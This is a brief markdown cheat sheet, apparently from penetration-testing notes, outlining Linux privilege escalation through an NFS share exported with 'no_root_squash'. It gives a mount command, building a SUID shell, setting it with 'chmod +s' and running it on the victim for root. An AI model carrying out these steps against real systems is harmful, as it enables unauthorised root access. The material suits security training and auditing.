# NFS + SUID Weak Permissions

- Build an SUID shell and compile
- On the victim, check /etc/exports for "no_root_squash" flag
- mount -o rw,vers=2 $TARGET:/shared /tmp/shared
- create shell, compile and place in the share
- chmod +s suidshell
- on victim, run the suidshell to get root
